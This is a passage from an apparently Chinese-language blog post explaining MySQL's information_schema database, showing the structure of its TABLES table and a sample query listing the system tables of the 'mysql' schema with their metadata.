class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> test               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>###TABLES表<br><code>information_schema.TABLES</code>表提供了关于数据库中的<code>表</code>的信息（包括视图）。是<code>show tables from [schemaname]</code>的结果。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> information_schema.tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> Field           <span class="operator">|</span> Type                <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CATALOG   <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">512</span>)        <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_SCHEMA    <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_NAME      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_TYPE      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ENGINE          <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> VERSION         <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ROW_FORMAT      <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_ROWS      <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AVG_ROW_LENGTH  <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> DATA_LENGTH     <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MAX_DATA_LENGTH <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> INDEX_LENGTH    <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> DATA_FREE       <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> AUTO_INCREMENT  <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CREATE_TIME     <span class="operator">|</span> datetime            <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> UPDATE_TIME     <span class="operator">|</span> datetime            <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHECK_TIME      <span class="operator">|</span> datetime            <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_COLLATION <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>)         <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CHECKSUM        <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">21</span>) unsigned <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CREATE_OPTIONS  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">255</span>)        <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TABLE_COMMENT   <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">2048</span>)       <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span>         <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------------------+------+-----+---------+-------+</span></span><br><span class="line"><span class="number">21</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中，<code>table_schema</code>为数据库名称；<code>table_name</code>为表名；<code>table_rows</code>为该表中的数据行数.<br>如想通过information_schema查询名为mysql的数据库中所有表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;mysql&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+---------------------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-------------------+----------+--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_CATALOG <span class="operator">|</span> TABLE_SCHEMA <span class="operator">|</span> TABLE_NAME                <span class="operator">|</span> TABLE_TYPE <span class="operator">|</span> ENGINE <span class="operator">|</span> VERSION <span class="operator">|</span> ROW_FORMAT <span class="operator">|</span> TABLE_ROWS <span class="operator">|</span> AVG_ROW_LENGTH <span class="operator">|</span> DATA_LENGTH <span class="operator">|</span> MAX_DATA_LENGTH    <span class="operator">|</span> INDEX_LENGTH <span class="operator">|</span> DATA_FREE <span class="operator">|</span> AUTO_INCREMENT <span class="operator">|</span> CREATE_TIME         <span class="operator">|</span> UPDATE_TIME         <span class="operator">|</span> CHECK_TIME          <span class="operator">|</span> TABLE_COLLATION   <span class="operator">|</span> CHECKSUM <span class="operator">|</span> CREATE_OPTIONS     <span class="operator">|</span> TABLE_COMMENT                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------+---------------------------+------------+--------+---------+------------+------------+----------------+-------------+--------------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-------------------+----------+--------------------+-----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> columns_priv              <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">227994731135631359</span> <span class="operator">|</span>         <span class="number">4096</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">Column</span> privileges                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> db                        <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">123848989752688639</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Database privileges                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> event                     <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Events                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> func                      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">162974011515469823</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">User</span> defined functions                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> general_log               <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> CSV    <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> General log                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> help_category             <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>         <span class="number">40</span> <span class="operator">|</span>             <span class="number">28</span> <span class="operator">|</span>        <span class="number">1120</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">3072</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> help categories                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> help_keyword              <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>        <span class="number">611</span> <span class="operator">|</span>            <span class="number">197</span> <span class="operator">|</span>      <span class="number">120367</span> <span class="operator">|</span>  <span class="number">55450570411999231</span> <span class="operator">|</span>        <span class="number">21504</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> help keywords                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> help_relation             <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>       <span class="number">1218</span> <span class="operator">|</span>              <span class="number">9</span> <span class="operator">|</span>       <span class="number">10962</span> <span class="operator">|</span>   <span class="number">2533274790395903</span> <span class="operator">|</span>        <span class="number">21504</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> keyword<span class="operator">-</span>topic relation                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> help_topic                <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>        <span class="number">583</span> <span class="operator">|</span>            <span class="number">975</span> <span class="operator">|</span>      <span class="number">568664</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>        <span class="number">22528</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> help topics                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> innodb_index_stats        <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">3</span> <span class="operator">|</span>           <span class="number">5461</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span>                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> innodb_table_stats        <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span>          <span class="number">16384</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span>                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> ndb_binlog_index          <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> latin1_swedish_ci <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span>                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> plugin                    <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> MySQL plugins                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> proc                      <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> <span class="keyword">Dynamic</span>    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>    <span class="number">281474976710655</span> <span class="operator">|</span>         <span class="number">2048</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> Stored Procedures                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> procs_priv                <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">239253730204057599</span> <span class="operator">|</span>         <span class="number">4096</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">Procedure</span> privileges                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> proxies_priv              <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">2</span> <span class="operator">|</span>            <span class="number">693</span> <span class="operator">|</span>        <span class="number">1386</span> <span class="operator">|</span> <span class="number">195062158860484607</span> <span class="operator">|</span>         <span class="number">5120</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">53</span> <span class="operator">|</span> utf8_bin          <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> <span class="keyword">User</span> proxy privileges                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> servers                   <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> MyISAM <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Fixed      <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> <span class="number">433752939111120895</span> <span class="operator">|</span>         <span class="number">1024</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="number">2016</span><span class="number">-08</span><span class="number">-30</span> <span class="number">19</span>:<span class="number">14</span>:<span class="number">48</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>                    <span class="operator">|</span> MySQL <span class="keyword">Foreign</span> Servers <span class="keyword">table</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def           <span class="operator">|</span> mysql        <span class="operator">|</span> slave_master_info         <span class="operator">|</span> BASE <span class="keyword">TABLE</span> <span class="operator">|</span> InnoDB <span class="operator">|</span>      <span class="number">10</span> <span class="operator">|</span> Compact    <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="number">0</span> <span class="operator">|</span>       <span class="number">16384</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span>            <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">2017</span><span class="number">-04</span><span class="number">-19</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">05</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> utf8_general_ci   <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> stats_persistent<span class="operator">=</span><span class="number">0</span> <span class="operator">|</span> 